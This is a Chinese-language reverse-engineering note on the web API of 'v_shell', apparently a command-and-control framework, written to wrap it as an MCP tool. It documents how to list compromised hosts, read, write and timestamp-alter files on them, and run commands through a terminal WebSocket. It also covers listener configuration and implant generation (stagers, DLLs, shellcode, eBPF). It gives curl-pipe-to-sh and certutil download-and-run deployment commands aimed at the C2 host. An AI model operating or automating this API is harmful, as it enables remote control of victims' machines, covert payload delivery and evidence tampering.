# v_shell Web API 逆向笔记

通过对管理台前端 bundle 的分析 + 实测,梳理出 MCP 所需的接口。版本:`v2.10.1`(前端 SPA,Vue + vben admin)。

## 认证

- 登录:`POST /api/login`,JSON body `{"username":"admin","password":"..."}`
  - 返回 `{"code":0,"message":"ok","result":{"token":"<JWT>"},...}`
- 之后所有 API 请求需带请求头 **`Token: <JWT>`**(注意不是 `Authorization: Bearer`)
- JWT 过期(约 12h)时接口返回 HTTP 401,应重新登录
- 注:管理台静态资源 `/` 还有一层 HTTP Basic Auth,但 `/api/*` 不需要

## 统一响应包

```json
{ "code": 0, "message": "ok", "result": <any>, "type": "success" }
```
`code == 0` 为成功;非 0 为业务错误(如 `code:-1 "client is close"`)。

## 客户端/主机

| 接口 | 方法 | 参数(JSON body) | 返回 |
|---|---|---|---|
| `/client/list` | POST | `{"page":1,"pageSize":9999,"status":bool?}` | `{clientCount,clientOnlineCount,items:[Host],total}` |
| `/client/editremark` | POST | `{id, remark}` | - |
| `/client/dellist` | POST | `{id}` | 删除主机 |
| `/client/delfile` | POST | `{id}` | 删除主机文件 |

Host 字段:`Id, IsConnect, Addr(外网IP), LocalIP, HostName, OsName, UserName, Location, ProcessName, Tp(连接方式), Remark, Status, ...`

## 文件管理

通用参数:`id`=主机Id,`path`=目录,`target`=文件名/URL,`name`=批量名列表。

| 接口 | 参数 | 返回 |
|---|---|---|
| `/file/getdisk` | `{id}` | `[{name,isDir,time,mode,size}]` |
| `/file/ls` | `{id, path}` | `{items:[{name,isDir,time,mode,size}], total}` |
| `/file/cat` | `{id, path, target}` | `{content}` |
| `/file/edit` | `{id, path, target, content}` | 写文件 |
| `/file/mkdir` | `{id, path, target}` | 建目录 |
| `/file/touch` | `{id, path, target}` | 建空文件 |
| `/file/rm` | `{id, path, target}` | 删单个 |
| `/file/rmlist` | `{id, path, name:[...]}` | 批量删 |
| `/file/mv` | `{id, path, target, to}` | 重命名/移动 |
| `/file/modifytime` | `{id, path, target, time}` | 改时间 |
| `/file/wget` | `{id, path, target:<url>}` | 主机用 URL 下载 |
| `/file/downloadtoserver` | `{id, path, target}` | 把主机文件拉到服务端 |
| `/file/getdownloadper` | `{id, path, target, size}` | `{pre:0-100}` 进度 |
| `/file/downloadtobrowser` | GET query `?id=&target=` | 文件字节流 |
| `/file/upload` | multipart `file`+`id`+`path` | 顶层 `{url:"/path/name"}` |

上传/下载流程:
- 下载:先 `downloadtoserver` → 轮询 `getdownloadper` 到 `pre>=100` → `GET downloadtobrowser`
- 上传:`multipart/form-data`,`file` 字段文件名即主机侧文件名

## 命令控制(终端 WebSocket)

- 地址:`ws(s)://<host>:<port>/api/terminal/ws?id=<主机Id>&token=<JWT>`
  (https → wss;前缀与 API 相同)
- 协议:原始双向字节流(xterm.js AttachAddon)。连接后服务端先发 shell prompt
  (如 `www-data@chps3023:/tmp$ `),之后发送的字符作为终端输入,输出原样返回。
- 关键点(实测):
  - **必须等 prompt 到达后再发命令**,否则输入丢失
  - 发送用文本帧;`\r` 视为回车
  - 可靠取输出的做法:先 `stty -echo 2>/dev/null; PS1='> '; clear`,再发
    `echo <B>; <cmd>; echo <D>`,读取直到出现 `<D>`,取 `<B>` 与 `<D>` 之间即纯输出
  - 连接失败/被关闭时重试(服务端对并发终端有限制,偶发瞬断)

## 监听器(对应 /listener/list)

接口前缀 `/api`(POST JSON body):

| 接口 | 参数 | 返回 |
|---|---|---|
| `/listener/list` | `{page, pageSize, status?, mode?}` | `{items:[Listener], total}` |
| `/listener/add` | `{ClientId, Mode, ListenAddr, ConnectAddr?, WsConnectAddr?, DNSDomain?, PublicDNS?, DisconnectTimeout, PingInterval, Vkey, EncryptSalt, OssUrl?, Remark}` | - |
| `/listener/editremark` | `{id, remark}` | - |
| `/listener/edit` | 同 add + Id | - |
| `/listener/del` | `{id}` | 删除(需求要求 MCP **不暴露**) |
| `/listener/dellist` | `{id:[ids]}` | 批量删除(MCP 不暴露) |
| `/listener/start` | `{id}` | 启用 |
| `/listener/stop` | `{id}` | 停用 |

Listener 字段:`Id, Mode(tcp/kcp/ws/dns/doh/dot/oss), Remark, ListenAddr, ConnectAddr, WsConnectAddr, DNSDomain, PublicDNS, DisconnectTimeout(超时心跳次数), PingInterval(心跳间隔), Vkey, EncryptSalt(流量加密盐), OssUrl, MaxDNSsize, Status`

模式→地址:
- `tcp`/`kcp`:`ConnectAddr`(外网连接地址)
- `ws`:`WsConnectAddr`
- `dns`/`doh`/`dot`:`DNSDomain` + `PublicDNS`
- `oss`:`OssUrl`(Bucket 域名)

## 客户端生成(对应 /download 客户端生成页)

客户端通过 **GET 直连下载**生成,带 `Token` 请求头,返回 `application/octet-stream` 二进制(`Content-Disposition` 带文件名)。接口路径都在 `/api` 前缀下:

| 类型 | URL | 参数 |
|---|---|---|
| Stage 反向 | `GET /download/stage` | `arch`(如 linux_amd64、windows_amd64.exe)+ `id`(监听器 Id) |
| 正向客户端 | `GET /download/listen` | `arch` `tp`(tcp/kcp/ws)`host` `port` `vkey` `salt` `upx` |
| DLL 正向 | `GET /download/listendll` | 同 listen(arch 为 windows_amd64.dll / windows_i386.dll);loader:`?arch=loader` |
| eBPF | `GET /download/listen` | `arch` `tp`(tcp/ws)`vkey` `salt` `upx` + 固定 `host=0.0.0.0&port=49319&listen=true&ebpf=true` |
| shellcode | `GET /download/shellcode` | `arch`(windows_amd64/windows_i386)+ `format`(.bin/.c/.raw.txt,拼在 arch 后)+ `id` |
| DLL(监听器) | `GET /download/dll` | `id` `arch`(windows_*.dll 或 loader)`upx` `proxy` |
| 无阶段 | `GET /download/stageless` | `id` `arch` `upx` `proxy` |

arch 取值:`darwin_amd64` `darwin_arm64` `linux_amd64` `linux_i386` `linux_arm64` `linux_arm` `windows_amd64(.exe/.dll)` `windows_i386(.exe/.dll)`。

上线脚本(部署命令)见 `/download/script` 页:Linux `(curl -fsSL -m180 <host>:<port>/slt|sh)`、Windows `certutil.exe -urlcache -split -f http://<host>:<port>/swt C:\Users\Public\run.bat && ...`(t/w/k 后缀对应 TCP/WebSocket/KCP)。

## 备注

- 前端 API 模块 bundle:`assets/vBWp-URsu.js`(client)、`vNpmal8v-.js`(file)、
  `v48IPFxKN.js`(terminal/xterm)。
- 上传大文件、下载大文件服务端都是异步/后台任务,超时设得很大。
